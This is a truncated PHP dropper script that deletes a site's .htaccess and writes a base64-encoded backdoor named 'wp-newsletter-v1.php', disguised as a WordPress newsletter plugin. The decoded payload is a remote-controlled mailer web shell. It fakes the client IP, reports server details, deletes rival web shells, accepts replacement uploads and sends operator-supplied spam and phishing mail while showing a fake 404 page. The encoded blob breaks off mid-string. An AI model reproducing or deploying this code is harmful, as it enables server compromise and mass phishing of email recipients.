<?php
			$Folder = dirname(__FILE__)."/";
			unlink($Folder.".htaccess");
file_put_contents($Folder."wp-newsletter-v1.php", base64_decode("PD9waHANCkBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdFdXJvcGUvTG9uZG9uJyk7DQpAZXJyb3JfcmVwb3J0aW5nKDApOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOw0KQGRlZmluZSgnTUFJTF9WRVJTSU9OJywgJzEuOS4wJyk7DQpAZGVmaW5lKCdNQUlMX1VSTCcsIEdldE1haWxVUkwoKSk7DQpAZGVmaW5lKCdSRURJUkVDVElPTl9GT0xERVInLCAieGZqdmlubiIpOw0KaWYgKGlzc2V0KCRfR0VUWydzZXJ2ZXItaW5mb3MnXSkpIHsNCiAgICBDcmVhdGVIVGFjY2VzcygpOw0KICAgICRTRVJWRVJfSU5GT1MgPSAkX1NFUlZFUjsNCiAgICBpZiAoIWlzX2FycmF5KCRTRVJWRVJfSU5GT1MpKSB7DQogICAgICAgICRTRVJWRVJfSU5GT1MgPSBhcnJheSgpOw0KICAgIH0NCiAgICAkU0VSVkVSX0lORk9TWydSRUFMX0lQX0dFVCddICAgICA9IEdldFBhZ2VDb250ZW50KCJodHRwOi8vbXlpcC5kbnNvbWF0aWMuY29tLyIpOw0KICAgICRTRVJWRVJfSU5GT1NbJ0VYUExPSVRfVkVSU0lPTiddID0gTUFJTF9WRVJTSU9OOw0KICAgIGVjaG8ganNvbl9lbmNvZGUoJFNFUlZFUl9JTkZPUyk7DQogICAgZXhpdDsNCn0NCiRfU0VSVkVSWydQSFBfU0VMRiddICAgICAgICAgID0gIi9pbmRleC5waHAiOw0KJEhUVFBfU0VSVkVSX1ZBUlNbJ1BIUF9TRUxGJ10gPSAiL2luZGV4LnBocCI7DQpmb3JlYWNoIChhcnJheSgNCiAgICAnSFRUUF9DTElFTlRfSVAnLA0KICAgICdIVFRQX1hfRk9SV0FSREVEX0ZPUicsDQogICAgJ0hUVFBfWF9GT1JXQVJERUQnLA0KICAgICdIVFRQX1hfQ0xVU1RFUl9DTElFTlRfSVAnLA0KICAgICdIVFRQX0ZPUldBUkRFRF9GT1InLA0KICAgICdIVFRQX0ZPUldBUkRFRCcsDQogICAgJ1JFTU9URV9BRERSJw0KKSBhcyAka2V5KSB7DQogICAgJF9TRVJWRVJbJGtleV0gICAgICAgICAgPSAiMTI3LjAuMC4xIjsNCiAgICAkSFRUUF9TRVJWRVJfVkFSU1ska2V5XSA9ICIxMjcuMC4wLjEiOw0KfQ0KaWYgKGlzc2V0KCRfR0VUWyd0ZXN0LWV4cGxvaXQnXSkpIHsNCiAgICBlY2hvICJFWFBMT0lUT0siOw0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ2RlbGV0ZS13c28nXSkpIHsNCiAgICBlY2hvIERlbGV0ZUJhZEZpbGVzKCk7DQogICAgZXhpdDsNCn0NCmZ1bmN0aW9uIERlbGV0ZUJhZEZpbGVzKCRkZWxldGUgPSBmYWxzZSwgJGZvbGRlciA9ICIiKSB7DQogICAgJEZpbGVUb0RlbGV0ZSAgPSBhcnJheSgpOw0KICAgICRGaWxlTGlzdCAgICAgID0gU2NhbkZvbGRlcihkaXJuYW1lKF9fRklMRV9fKSAuICIvIiAuICRmb2xkZXIpOw0KICAgICR3aGl0ZUZpbGUgICAgID0gYXJyYXkoDQogICAgICAgIGJhc2VuYW1lKF9fRklMRV9fKSwNCiAgICAgICAgImVycm9yX2xvZyIsDQogICAgICAgICIuaHRhY2Nlc3MiLA0KICAgICAgICAiLmh0bWwiLA0KICAgICAgICAiLmNzcyIsDQogICAgICAgICIucG5nIiwNCiAgICAgICAgIi5naWYiLA0KICAgICAgICAiLmpwZWciLA0KICAgICAgICAiLmpwZyIsDQogICAgICAgICIuaWNvIiwNCiAgICAgICAgIi5qcyINCiAgICApOw0KICAgICR3aGl0ZUZpbGVQcmVnID0gYXJyYXkoKTsNCiAgICBmb3JlYWNoICgkd2hpdGVGaWxlIGFzICR3aGl0ZUZpbGVUb0NoZWNrKSB7DQogICAgICAgICR3aGl0ZUZpbGVQcmVnW10gPSBwcmVnX3F1b3RlKCR3aGl0ZUZpbGVUb0NoZWNrLCAiLyIpOw0KICAgIH0NCiAgICAkQmxhY2tMaXN0ICAgICA9IGFycmF5KA0KICAgICAgICAiZGVmaW5lKCdNQUlMX1ZFUlNJT04nLCIsDQogICAgICAgICJfZl93cCINCiAgICApOw0KICAgICRCbGFja0xpc3RQcmVnID0gYXJyYXkoKTsNCiAgICBmb3JlYWNoICgkQmxhY2tMaXN0IGFzICRCbGFja0xpc3RUb0NoZWNrKSB7DQogICAgICAgICRCbGFja0xpc3RQcmVnW10gPSBwcmVnX3F1b3RlKCRCbGFja0xpc3RUb0NoZWNrLCAiLyIpOw0KICAgIH0NCiAgICAkd2hpdGVMaXN0ICAgICA9IGFycmF5KA0KICAgICAgICAiQHBhY2thZ2UiLA0KICAgICAgICAid3BfbmF2X21lbnUoIiwNCiAgICAgICAgImJsb2dpbmZvKCIsDQogICAgICAgICJsYW5ndWFnZV9hdHRyaWJ1dGVzKCIsDQogICAgICAgICJoYXNfbmF2X21lbnUoIiwNCiAgICAgICAgImJvZHlfY2xhc3MoIg0KICAgICk7DQogICAgJHdoaXRlTGlzdFByZWcgPSBhcnJheSgpOw0KICAgIGZvcmVhY2ggKCR3aGl0ZUxpc3QgYXMgJHdoaXRlTGlzdFRvQ2hlY2spIHsNCiAgICAgICAgJHdoaXRlTGlzdFByZWdbXSA9IHByZWdfcXVvdGUoJHdoaXRlTGlzdFRvQ2hlY2ssICIvIik7DQogICAgfQ0KICAgIGZvcmVhY2ggKCRGaWxlTGlzdCBhcyAkRmlsZVNjYW4pIHsNCiAgICAgICAgaWYgKCRGaWxlU2NhbiA9PSAiLiIgb3IgJEZpbGVTY2FuID09ICIuLiIgb3IgaXNfZGlyKCRGaWxlU2Nhbikgb3IgIWlzX2ZpbGUoJEZpbGVTY2FuKSBvciAkRmlsZVNjYW4gPT0gYmFzZW5hbWUoX19GSUxFX18pKSB7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy8nIC4gaW1wbG9kZSgifCIsICR3aGl0ZUZpbGVQcmVnKSAuICcvaScsICRGaWxlU2NhbikpIHsNCiAgICAgICAgICAgICRGaWxlQ2hlY2tDb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRGaWxlU2Nhbik7DQogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy8nIC4gaW1wbG9kZSgifCIsICR3aGl0ZUxpc3RQcmVnKSAuICcvaScsICRGaWxlQ2hlY2tDb250ZW50KSBvciBwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoInwiLCAkQmxhY2tMaXN0UHJlZykgLiAnL2knLCAkRmlsZUNoZWNrQ29udGVudCkpIHsNCiAgICAgICAgICAgICAgICBpZiAoIWlzX3dyaXRhYmxlKCRGaWxlU2NhbikpIHsNCiAgICAgICAgICAgICAgICAgICAgJFdyaXRhYmxlID0gJyAtIDxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Ij4oVGhpcyBmaWxlIGNhblwndCBiZSBlZGl0L2RlbGV0ZWQgISk8L3NwYW4+JzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkV3JpdGFibGUgPSAnIC0gPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+KFRoaXMgZmlsZSBjYW4gYmUgZWRpdC9kZWxldGVkICEpPC9zcGFuPic7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmIChpc3NldCgkX0dFVFsnYWN0aW9uJ10pKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkX0dFVFsnYWN0aW9uJ10gPT0gImRlbGV0ZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRGaWxlVG9EZWxldGVbXSA9ICRGaWxlU2NhbjsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRGaWxlVG9EZWxldGVbXSA9ICRGaWxlU2NhbiAuICRXcml0YWJsZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkZGVsZXRlID09IHRydWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRGaWxlVG9EZWxldGVbXSA9ICRGaWxlU2NhbjsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRGaWxlVG9EZWxldGVbXSA9ICRGaWxlU2NhbiAuICRXcml0YWJsZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoJF9HRVRbJ2FjdGlvbiddID09ICJkZWxldGUiIG9yICRkZWxldGUgPT0gdHJ1ZSkgew0KICAgICAgICBmb3JlYWNoICgkRmlsZVRvRGVsZXRlIGFzICREZWxldGVGaWxlKSB7DQogICAgICAgICAgICBAdW5saW5rKCREZWxldGVGaWxlKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIk9LIjsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4ganNvbl9lbmNvZGUoJEZpbGVUb0RlbGV0ZSk7DQogICAgfQ0KfQ0KaWYgKGlzc2V0KCRfR0VUWydzZWxmLXVwZGF0ZSddKSkgew0KICAgICRDdXJyZW50RmlsZSA9IF9fRklMRV9fOw0KICAgICRTYXZlQ29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkQ3VycmVudEZpbGUpOw0KICAgIGlmICgkX0ZJTEVTWydmJ11bJ3RtcF9uYW1lJ10gIT0gIiIpIHsNCiAgICAgICAgaWYgKEB1bmxpbmsocHJlZ19yZXBsYWNlKCchXChcZCtcKVxzLiohJywgJycsIF9fRklMRV9fKSkpIHsNCiAgICAgICAgICAgIGlmIChAbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2YnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZiddWyduYW1lJ10pKSB7DQogICAgICAgICAgICAgICAgZWNobyAiT0siOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJEN1cnJlbnRGaWxlLCAkU2F2ZUNvbnRlbnQpOw0KICAgICAgICAgICAgICAgIGVjaG8gIk5PIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGVjaG8gIk5PX0RFTEVURSI7DQogICAgICAgIH0NCiAgICB9DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnY2hlY2tfbWFpbF9zbXRwJ10pKSB7DQogICAgJHNtdHAgPSBuZXcgU01UUDsNCiAgICAkSG9zdCA9ICJzbXRwLmxpdmUuY29tIjsNCiAgICAkUG9ydCA9IDI1Ow0KICAgIGlmIChpc3NldCgkX0dFVFsnaG9zdCddKSAmJiAkX0dFVFsnaG9zdCddICE9ICIiKSB7DQogICAgICAgICRIb3N0ID0gJF9HRVRbJ2hvc3QnXTsNCiAgICB9DQogICAgaWYgKGlzc2V0KCRfR0VUWydwb3J0J10pICYmICRfR0VUWydwb3J0J10gIT0gIiIpIHsNCiAgICAgICAgJFBvcnQgPSAkX0dFVFsncG9ydCddOw0KICAgIH0NCgkkdXJsU2hlbGwgPSBHZXRSZWRpcmVjdGlvbkxpbmsoJF9HRVRbJ3JlYWxfdXJsJ10pOw0KICAgIGlmICgkdXJsU2hlbGwgPT09IGZhbHNlKSB7DQogICAgICAgIGVjaG8gIk5PX1JFRElSRUNUSU9OIjsNCiAgICAgICAgZXhpdDsNCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKCEkc210cC0+Y29ubmVjdCgkSG9zdCwgJFBvcnQsIDEwKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignQ29ubmVjdCBmYWlsZWQnKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRzbXRwLT5oZWxsbygibG9jYWxob3N0LmxvY2FsZG9tYWluIikpIHsNCiAgICAgICAgICAgICRTTVRQX0VSUk9SID0gJHNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdFSExPIGZhaWxlZDogJyAuICRTTVRQX0VSUk9SWydlcnJvciddKTsNCiAgICAgICAgfQ0KICAgICAgICAkZSA9ICRzbXRwLT5nZXRTZXJ2ZXJFeHRMaXN0KCk7DQogICAgICAgIGlmIChpc19hcnJheSgkZSkgJiYgYXJyYXlfa2V5X2V4aXN0cygnU1RBUlRUTFMnLCAkZSkpIHsNCiAgICAgICAgICAgICR0bHNvayA9ICRzbXRwLT5zdGFydFRMUygpOw0KICAgICAgICAgICAgaWYgKCEkdGxzb2spIHsNCiAgICAgICAgICAgICAgICAkU01UUF9FUlJPUiA9ICRzbXRwLT5nZXRFcnJvcigpOw0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0ZhaWxlZCB0byBzdGFydCBlbmNyeXB0aW9uOiAnIC4gJFNNVFBfRVJST1JbJ2Vycm9yJ10pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCEkc210cC0+aGVsbG8oImxvY2FsaG9zdC5sb2NhbGRvbWFpbiIpKSB7DQogICAgICAgICAgICAgICAgJFNNVFBfRVJST1IgPSAkc210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdFSExPICgyKSBmYWlsZWQ6ICcgLiAkU01UUF9FUlJPUlsnZXJyb3InXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkZSA9ICRzbXRwLT5nZXRTZXJ2ZXJFeHRMaXN0KCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2FycmF5KCRlKSAmJiBhcnJheV9rZXlfZXhpc3RzKCdBVVRIJywgJGUpKSB7DQogICAgICAgICAgICBlY2hvICJPSyI7DQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICBlY2hvICRlLT5nZXRNZXNzYWdlKCk7DQogICAgfQ0KICAgICRzbXRwLT5xdWl0KHRydWUpOw0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ3NlbmRfY2FtcGFpZ25fcGhwJ10pKSB7DQogICAgQ3JlYXRlSFRhY2Nlc3MoKTsNCiAgICBlY2hvIEdldFBhZ2VDb250ZW50KHVybGRlY29kZSgkX0dFVFsncmVhbF91cmwnXSkgLiAiP3NlbmRfY2FtcGFpZ25fcGhwX2FjdGlvbj10cnVlJnJlYWxfdXJsPSIgLiAkX0dFVFsncmVhbF91cmwnXSwgJF9QT1NUKTsNCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydzZW5kX2NhbXBhaWduX3BocF9hY3Rpb24nXSkpIHsNCiAgICAkUmV0dXJuVGV4dCA9IGFycmF5KCk7DQogICAgJEFsbENvbW1hbmQgPSB1bnNlcmlhbGl6ZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsnY29tbWFuZCddKSk7DQoJJHVybFNoZWxsID0gR2V0UmVkaXJlY3Rpb25MaW5rKCRfR0VUWydyZWFsX3VybCddKTsNCiAgICBpZiAoJHVybFNoZWxsID09PSBmYWxzZSAmJiBwcmVnX21hdGNoKCcvJyAuIHByZWdfcXVvdGUoIltzaGVsbF9yZXdyaXRlX3VybF0iLCAiLyIpIC4gJy9pJywgJENvbW1hbmRbJ2NvbnRlbnQnXSkpIHsNCiAgICAgICAgZWNobyAiTk9fUkVESVJFQ1RJT04iOw0KICAgICAgICBleGl0Ow0KICAgIH0NCiAgICBmb3JlYWNoICgkQWxsQ29tbWFuZCBhcyAkQ29tbWFuZCkgew0KICAgICAgICAkbWFpbCAgICAgPSBuZXcgU2lsdGh4TWFpbGVyOw0KICAgICAgICANCiAgICAgICAgJHNtdHAgPSBpc3NldCgkQ29tbWFuZFsnc210cCddKSA/ICRDb21tYW5kWydzbXRwJ10gOiAnJzsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRzbXRwKSkgew0KICAgICAgICAgICAgaWYgKGlzc2V0KCRDb21tYW5kWydzbXRwJ11bJ3NlbmRlcl9lbWFpbCddKSkgew0KICAgICAgICAgICAgICAgICRGcm9tID0gJENvbW1hbmRbJ3NtdHAnXVsnc2VuZGVyX2VtYWlsJ107DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRGcm9tID0gJENvbW1hbmRbJ3NtdHAnXVsndXNlciddOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJG1haWwtPmlzU01UUCgpOw0KICAgICAgICAgICAgJG1haWwtPkhvc3QgICAgICAgICAgPSAkQ29tbWFuZFsnc210cCddWydob3N0J107DQogICAgICAgICAgICAkbWFpbC0+U01UUEF1dGggICAgICA9IHRydWU7DQogICAgICAgICAgICAkbWFpbC0+U01UUEtlZXBBbGl2ZSA9IHRydWU7DQogICAgICAgICAgICAkbWFpbC0+U01UUEF1dG9UTFMgICA9IGZhbHNlOw0KICAgICAgICAgICAgaWYgKCRDb21tYW5kWydzbXRwJ11bJ3NlY3VyaXR5J10gPT0gImF1dG8iKSB7DQogICAgICAgICAgICAgICAgJG1haWwtPlNNVFBBdXRvVExTID0gdHJ1ZTsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkQ29tbWFuZFsnc210cCddWydzZWN1cml0eSddID09ICJ0bHMiKSB7DQogICAgICAgICAgICAgICAgJG1haWwtPlNNVFBTZWN1cmUgPSAndGxzJzsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkQ29tbWFuZFsnc210cCddWydzZWN1cml0eSddID09ICJzc2wiKSB7DQogICAgICAgICAgICAgICAgJG1haWwtPlNNVFBTZWN1cmUgPSAnc3NsJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRtYWlsLT5Qb3J0ICAgICA9ICRDb21tYW5kWydzbXRwJ11bJ3BvcnQnXTsNCiAgICAgICAgICAgICRtYWlsLT5Vc2VybmFtZSA9ICRDb21tYW5kWydzbXRwJ11bJ3VzZXInXTsNCiAgICAgICAgICAgICRtYWlsLT5QYXNzd29yZCA9ICRDb21tYW5kWydzbXRwJ11bJ3Bhc3MnXTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICREb21haW4gPSBnZXRfZG9tYWluKCJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQogICAgICAgICAgICBpZiAoJENvbW1hbmRbJ2Zyb20nXSAhPSAiIikgew0KICAgICAgICAgICAgICAgICRGcm9tID0gJENvbW1hbmRbJ2Zyb20nXSAuICdAJyAuICREb21haW47DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICREb21haW4gPSBnZXRfZG9tYWluKCJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQogICAgICAgICAgICAgICAgJEZyb20gICA9ICdjb250YWN0QCcgLiAkRG9tYWluOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRtYWlsLT5zZXRGcm9tKCRGcm9tLCAkQ29tbWFuZFsnbmFtZSddKTsNCiAgICAgICAgJG1haWwtPlNlbmRlciA9ICRGcm9tOw0KICAgICAgICAkbWFpbC0+YWRkQWRkcmVzcygkQ29tbWFuZFsndG8nXSk7DQogICAgICAgICRtYWlsLT5TdWJqZWN0ID0gJENvbW1hbmRbJ3N1YmplY3QnXTsNCiAgICAgICAgJG1haWwtPlhNYWlsZXIgPSAnICc7DQogICAgICAgICRDb250ZW50ICAgICAgID0gc3RyX3JlcGxhY2UoJ1tzaGVsbF9yZXdyaXRlX3VybF0nLCAkdXJsU2hlbGwsICRDb21tYW5kWydjb250ZW50J10pOw0KICAgICAgICBpZiAoJENvbW1hbmRbJ3NvdXJjZV90eXBlJ10gPT0gImh0bWwiKSB7DQogICAgICAgICAgICAkbWFpbC0+bXNnSFRNTCgkQ29udGVudCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbWFpbC0+aXNIVE1MKGZhbHNlKTsNCiAgICAgICAgICAgICRtYWlsLT5Cb2R5ICAgID0gJENvbnRlbnQ7DQogICAgICAgICAgICAkbWFpbC0+QWx0Qm9keSA9ICRDb250ZW50Ow0KICAgICAgICB9DQogICAgICAgIGlmICgkQ29tbWFuZFsncmVwbHlfdG8nXSAhPSAiIikgew0KICAgICAgICAgICAgJG1haWwtPkFkZFJlcGx5VG8oJENvbW1hbmRbJ3JlcGx5X3RvJ10pOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1haWwtPkFkZFJlcGx5VG8oJEZyb20sICRDb21tYW5kWyduYW1lJ10pOw0KICAgICAgICB9DQogICAgICAgIGlmICgkQ29tbWFuZFsnZmlsZSddICE9ICIiKSB7DQogICAgICAgICAgICAkRmlsZUV4dGVuc2lvbiA9IHBhdGhpbmZvKHBhcnNlX3VybCgkQ29tbWFuZFsnZmlsZSddLCBQSFBfVVJMX1BBVEgpLCBQQVRISU5GT19FWFRFTlNJT04pOw0KICAgICAgICAgICAgJG1haWwtPmFkZFN0cmluZ0F0dGFjaG1lbnQoR2V0UGFnZUNvbnRlbnQoJENvbW1hbmRbJ2ZpbGUnXSksICRDb21tYW5kWydmaWxlbmFtZSddIC4gIi4iIC4gJEZpbGVFeHRlbnNpb24pOw0KICAgICAgICB9DQogICAgICAgIGlmICghJG1haWwtPnNlbmQoKSkgew0KICAgICAgICAgICAgJFJldHVyblRleHRbXSA9ICRDb21tYW5kWydpZCddIC4gIjoyOiIgLiAkbWFpbC0+RXJyb3JJbmZvOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJFJldHVyblRleHRbXSA9ICRDb21tYW5kWydpZCddIC4gIjoxOiI7DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKGVtcHR5KCRSZXR1cm5UZXh0KSkgew0KICAgICAgICBlY2hvICJOTyI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyBpbXBsb2RlKCc6fDonLCAkUmV0dXJuVGV4dCk7DQogICAgfQ0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ2NoZWNrX2luYm94X3BocCddKSkgew0KICAgIGVjaG8gR2V0UGFnZUNvbnRlbnQodXJsZGVjb2RlKCRfR0VUWydyZWFsX3VybCddKSAuICI/Y2hlY2tfaW5ib3hfcGhwX2FjdGlvbj10cnVlJmVtYWlsPSIgLiAkX0dFVFsnZW1haWwnXSAuICImc3ViamVjdD0iIC4gJF9HRVRbJ3N1YmplY3QnXSAuICImZnJvbT0iIC4gJF9HRVRbJ2Zyb20nXSAuICImcmVhbF91cmw9IiAuICRfR0VUWydyZWFsX3VybCddKTsNCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydjaGVja19tYWlsX3BocCddKSkgew0KCSR1cmxTaGVsbCA9IEdldFJlZGlyZWN0aW9uTGluaygkX0dFVFsncmVhbF91cmwnXSk7DQoJaWYgKCR1cmxTaGVsbCA9PT0gZmFsc2UpIHsNCiAgICAgICAgZWNobyAiTk9fUkVESVJFQ1RJT04iOw0KICAgICAgICBleGl0Ow0KICAgIH0NCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYWlsJykpIHsNCiAgICAgICAgZWNobyAiT0siOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGVjaG8gIk5PIjsNCiAgICB9DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnY2hlY2tfaW5ib3hfcGhwX2FjdGlvbiddKSkgew0KICAgICRtYWlsICAgICAgICAgID0gbmV3IFNpbHRoeE1haWxlcjsNCiAgICAkRG9tYWluICAgICAgICA9IHN0cnRvbG93ZXIoZ2V0X2RvbWFpbigiaHR0cDovLyIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pKTsNCiAgICAkRXhwbG9kZURvbWFpbiA9IGV4cGxvZGUoIi4iLCAkRG9tYWluKTsNCiAgICAkTmFtZSAgICAgICAgICA9IHVjZmlyc3QoJEV4cGxvZGVEb21haW5bMF0pOw0KICAgIGlmIChpc3NldCgkX0dFVFsnZnJvbSddKSkgew0KICAgICAgICAkRnJvbSA9ICRfR0VUWydmcm9tJ107DQogICAgfSBlbHNlIHsNCiAgICAgICAgJEZyb20gPSAnY29udGFjdEAnIC4gJERvbWFpbjsNCiAgICB9DQogICAgJG1haWwtPnNldEZyb20oJEZyb20sICROYW1lKTsNCiAgICAkbWFpbC0+U2VuZGVyID0gJEZyb207DQogICAgJG1haWwtPkFkZFJlcGx5VG8oJEZyb20sICROYW1lKTsNCiAgICAkbWFpbC0+YWRkQWRkcmVzcygkX0dFVFsnZW1haWwnXSk7DQogICAgJG1haWwtPlN1YmplY3QgPSAkX0dFVFsnc3ViamVjdCddOw0KICAgICRtYWlsLT5YTWFpbGVyID0gJyAnOw0KICAgIGlmIChpc3NldCgkX0dFVFsnYm9keSddKSkgew0KICAgICAgICAkbWFpbC0+Qm9keSA9ICRfR0VUWydib2R5J107DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG1haWwtPkJvZHkgPSAiSGVsbG8sIGFzIHlvdSBhc2sgb24gb3VyIHdlYnNpdGUsIHRoaXMgaXMgeW91ciBhcGkga2V5IGZvciB1c2Ugb3VyIHNlcnZpY2UgOiAiIC4gbWQ1KHVuaXFpZCh0aW1lKCkpKTsNCiAgICB9DQogICAgaWYgKCEkbWFpbC0+c2VuZCgpKSB7DQogICAgICAgIGVjaG8gIk5PIjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvICJPSyI7DQogICAgfQ0KICAgIGV4aXQ7DQp9DQpEaXNwbGF5NDA0UGFnZSgpOw0KZnVuY3Rpb24gZ2V0X2RvbWFpbigkdXJsKSB7DQogICAgJHBpZWNlcyA9IHBhcnNlX3VybCgkdXJsKTsNCiAgICAkZG9tYWluID0gaXNzZXQoJHBpZWNlc1snaG9zdCddKSA/ICRwaWVjZXNbJ2hvc3QnXSA6ICcnOw0KICAgIGlmIChwcmVnX21hdGNoKCcvKD9QPGRvbWFpbj5bYS16MC05XVthLXowLTlcLV17MSw2M31cLlthLXpcLl17Miw2fSkkL2knLCAkZG9tYWluLCAkcmVncykpIHsNCiAgICAgICAgcmV0dXJuICRyZWdzWydkb21haW4nXTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KZnVuY3Rpb24gcmFuZFN0cigkbGVuZ3RoKSB7DQogICAgJGNoYXJhY3RlcnMgICAgICAgPSAnMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVonOw0KICAgICRjaGFyYWN0ZXJzTGVuZ3RoID0gc3RybGVuKCRjaGFyYWN0ZXJzKTsNCiAgICAkcmFuZG9tU3RyaW5nICAgICA9ICcnOw0KICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsNCiAgICAgICAgJHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsICRjaGFyYWN0ZXJzTGVuZ3RoIC0gMSldOw0KICAgIH0NCiAgICByZXR1cm4gJHJhbmRvbVN0cmluZzsNCn0NCmZ1bmN0aW9uIFNjYW5Gb2xkZXIoJGRpcikgew0KICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCdzY2FuZGlyJykpIHsNCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsNCiAgICAgICAgd2hpbGUgKGZhbHNlICE9PSAoJGZpbGVuYW1lID0gcmVhZGRpcigkZGgpKSkgew0KICAgICAgICAgICAgJGZpbGVzW10gPSAkZmlsZW5hbWU7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkZmlsZXMgPSBzY2FuZGlyKCRkaXIpOw0KICAgIH0NCiAgICByZXR1cm4gJGZpbGVzOw0KfQ0KZnVuY3Rpb24gY1VSTFJlcXVlc3QoJHVybCwgJHBvc3RGaWVsZHMgPSBudWxsLCAkaHR0cEhlYWRlciA9IGFycmF5KCkpIHsNCiAgICAkY2ggPSBjdXJsX2luaXQoKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRlJFU0hfQ09OTkVDVCwgdHJ1ZSk7DQogICAgaWYgKCFlbXB0eSgkcG9zdEZpZWxkcykpIHsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJHBvc3RGaWVsZHMpOw0KICAgIH0NCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOyBXa